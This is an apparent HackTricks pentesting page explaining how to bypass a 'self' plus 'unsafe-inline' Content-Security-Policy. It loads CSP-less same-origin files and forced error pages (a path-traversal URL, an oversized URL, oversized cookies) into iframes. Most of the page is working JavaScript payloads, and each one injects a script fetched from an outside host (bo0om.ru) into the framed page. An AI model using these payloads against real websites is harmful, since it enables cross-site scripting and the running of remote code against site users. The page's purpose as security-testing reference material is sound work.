
Learn AWS hacking from zero to hero with htARTE (HackTricks AWS Red Team Expert)!

##
#
https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/content-security-policy-csp-bypass/csp-bypass-self-+-unsafe-inline-with-iframes.md
#
##

A configuration such as:

Content-Security-Policy: default-src ‘self’ ‘unsafe-inline’;

Prohibits usage of any functions that execute code transmitted as a string. For example: eval, setTimeout, setInterval will all be blocked because of the setting unsafe-eval

Any content from external sources is also blocked, including images, CSS, WebSockets, and, especially, JS
Via text & images

Modern browsers transform images and texts into HTML files to visualize them better (set background, center, etc).

Therefore, if you open an image or txt file such as favicon.ico or robots.txt with an iframe, you will open it as HTML.

These kinds of pages usually don't have CSP headers and might not have X-Frame-Options, so you can execute arbitrary JS from them:
```
frame=document.createElement("iframe");
frame.src="/css/bootstrap.min.css";
document.body.appendChild(frame);
script=document.createElement('script');
script.src='//bo0om.ru/csp.js';
window.frames[0].document.head.appendChild(script);
```
Via Errors

Same as text files or images, error responses usually don't have CSP headers and might not have X-Frame-Options. So, you can force errors and load them inside an iframe:
```
// Force nginx error
frame=document.createElement("iframe");
frame.src="/%2e%2e%2f";
document.body.appendChild(frame);

// Force error via long URL
frame=document.createElement("iframe");
frame.src="/"+"A".repeat(20000);
document.body.appendChild(frame);

// Force error via long cookies
for(var i=0;i<5;i++){document.cookie=i+"="+"a".repeat(4000)};
frame=document.createElement("iframe");
frame.src="/";
document.body.appendChild(frame);
// Don't forget to remove them
for(var i=0;i<5;i++){document.cookie=i+"="}

// After any of the previous examples, you can execute JS in the iframe with something like:
script=document.createElement('script');
script.src='//bo0om.ru/csp.js';
window.frames[0].document.head.appendChild(script);
```
References

    https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/

Learn AWS hacking from zero to hero with htARTE (HackTricks AWS Red Team Expert)!
